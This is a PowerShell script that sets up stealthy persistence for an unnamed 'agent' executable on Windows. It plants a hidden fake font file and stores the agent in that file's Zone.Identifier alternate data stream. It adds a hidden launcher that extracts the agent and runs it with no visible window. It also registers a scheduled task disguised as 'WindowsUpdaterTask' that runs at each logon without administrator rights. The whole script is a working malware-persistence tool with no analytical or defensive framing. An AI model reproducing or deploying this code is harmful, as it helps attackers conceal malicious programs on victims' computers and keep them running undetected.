$ProgressPreference = 'SilentlyContinue'
param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "❌ AgentPath environment variable not set."
    exit
}

# --- 1. Create fake font file in Fonts folder ---
$fontDir = "$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
if (-not (Test-Path $fontDir)) {
    New-Item -ItemType Directory -Path $fontDir -Force | Out-Null
    attrib +h $fontDir
    Write-Output "[+] Created hidden fonts folder"
}

$fontFile = "$fontDir\seguibl.ttf"
if (-not (Test-Path $fontFile)) {
    $fakeFontContent = "TTF fake font file - do not delete"
    Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
    attrib +h $fontFile
    Write-Output "[+] Created fake font file: $fontFile"
} else {
    Write-Output "[+] Using existing font file: $fontFile"
}

# --- 2. Hide agent in ADS ---
$streamName = "Zone.Identifier"
Write-Output "[+] Hiding agent in ADS: $fontFile`:$streamName"
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$fontFile`:$streamName"

# --- 3. Create launcher script (run.ps1) with cleanup and progress suppression ---
$launcherPath = "$fontDir\run.ps1"
$launcherContent = @"
`$ProgressPreference = 'SilentlyContinue'
`$fontFile = '$fontFile'
`$streamName = '$streamName'
`$tempAgent = "`$env:TEMP\agent.exe"

# Delete old temp file if it exists
if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force -ErrorAction SilentlyContinue }

# Extract agent from ADS
`$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
if (`$bytes) {
    [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
    Start-Process -WindowStyle Hidden `$tempAgent
}
"@
Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
attrib +h $launcherPath
Write-Output "[+] Created launcher with cleanup: $launcherPath"

# --- 4. Create scheduled task via COM (no admin, no password prompt) ---
$taskName = "WindowsUpdaterTask"

try {
    # Suppress ALL output from COM operations with *>$null
    $taskService = New-Object -ComObject Schedule.Service *>$null
    $taskService.Connect() *>$null
    $rootFolder = $taskService.GetFolder("\") *>$null

    # Delete existing task if any
    try { $rootFolder.DeleteTask($taskName, 0) *>$null } catch { }

    # Create a new task definition
    $taskDefinition = $taskService.NewTask(0) *>$null
    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
    $taskDefinition.Principal.UserId = $env:USERNAME
    $taskDefinition.Principal.LogonType = 3   # TASK_LOGON_INTERACTIVE_TOKEN

    # Add logon trigger
    $trigger = $taskDefinition.Triggers.Create(9) *>$null
    $trigger.UserId = $env:USERNAME

    # Add action – run the launcher script
    $action = $taskDefinition.Actions.Create(0) *>$null
    $action.Path = "powershell.exe"
    $action.Arguments = "-WindowStyle Hidden -File `"$launcherPath`""

    # Register the task (6 = UpdateOrCreate)
    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) *>$null
    Write-Output "[+] Scheduled task '$taskName' created/updated via COM."
} catch {
    Write-Output "[-] Failed to create scheduled task: $_"
}

Write-Output ""
Write-Output "✅ PERSISTENCE COMPLETE"
Write-Output "Script location: $launcherPath"
Write-Output "Agent hidden in: $hiddenPath"
Write-Output "The scheduled task will run the script from the permanent folder on next logon."